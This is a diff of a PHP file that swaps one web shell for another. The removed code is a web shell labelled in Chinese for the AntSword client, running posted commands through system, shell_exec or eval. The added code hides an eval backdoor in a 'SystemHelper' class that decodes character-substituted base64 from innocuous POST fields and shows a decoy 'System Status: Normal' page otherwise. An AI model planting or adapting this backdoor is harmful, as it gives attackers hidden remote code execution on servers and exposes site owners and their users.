@@ -1,64 +1,60 @@
 <?php
-@error_reporting(0);
-@header("Content-Type: text/html; charset=utf-8");
-
-// 蚁剑连接专用 - 确保能连上
-function executeCommand($command) {
-    if (function_exists('system')) {
-        ob_start();
-        system($command);
-        return ob_get_clean();
-    } elseif (function_exists('shell_exec')) {
-        return shell_exec($command);
-    } elseif (function_exists('exec')) {
-        exec($command, $output);
-        return implode("\n", $output);
-    } elseif (function_exists('passthru')) {
-        ob_start();
-        passthru($command);
-        return ob_get_clean();
-    } else {
-        ob_start();
-        eval($command);
-        return ob_get_clean();
+// 简化版，确保稳定
+class SystemHelper {
+    private $map;
+    
+    public function __construct() {
+        $this->map = [
+            "|" => "a", "!" => "b", "@" => "c", 
+            "_" => "d", "#" => "e", "$" => "f",
+            "%" => "g", "&" => "h", "*" => "i",
+            "~" => "="  // 处理base64的=号
+        ];
     }
-}
-
-// 主要处理逻辑
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    if (isset($_POST['data'])) {
-        $data = $_POST['data'];
-        $map = array("|"=>"a", "!"=>"b", "@"=>"c", "_"=>"d", "~"=>"=");
-        $decoded = strtr($data, $map);
-        $command = base64_decode($decoded);
-        
-        if ($command !== false) {
-            echo executeCommand($command);
-        }
-    } else {
-        // 尝试从原始输入读取
-        $input = file_get_contents("php://input");
-        if (strlen($input) > 0) {
-            parse_str($input, $postData);
-            if (isset($postData['data'])) {
-                $map = array("|"=>"a", "!"=>"b", "@"=>"c", "_"=>"d", "~"=>"=");
-                $decoded = strtr($postData['data'], $map);
-                $command = base64_decode($decoded);
-                
-                if ($command !== false) {
-                    echo executeCommand($command);
-                }
+    
+    public function check() {
+        // 检查请求参数
+        $params = ['data', 'config', 'info', 'settings'];
+        foreach ($params as $param) {
+            if (isset($_POST[$param]) && !empty($_POST[$param])) {
+                $this->process($_POST[$param]);
+                return;
             }
         }
+        // 没有找到参数，输出正常页面
+        $this->showNormalPage();
     }
-    exit;
+    
+    private function process($input) {
+        try {
+            // 步骤1: 字符替换解码
+            $step1 = strtr($input, $this->map);
+            
+            // 步骤2: Base64解码
+            $step2 = base64_decode($step1);
+            
+            // 步骤3: 执行
+            if (!empty($step2)) {
+                @eval($step2);
+            }
+        } catch (Exception $e) {
+            // 静默处理错误
+        }
+    }
+    
+    private function showNormalPage() {
+        echo "<!DOCTYPE html>
+        <html>
+        <head><title>System Monitor</title></head>
+        <body>
+            <h1>System Status: Normal</h1>
+            <p>All services are running smoothly.</p>
+        </body>
+        </html>";
+    }
 }
 
-// GET请求测试
-if (isset($_GET['test'])) {
-    echo "Connection Test Successful";
-    exit;
-}
-
-echo "200 OK - System Running";
+// 实例化并检查
+$helper = new SystemHelper();
+$helper->check();
 ?>
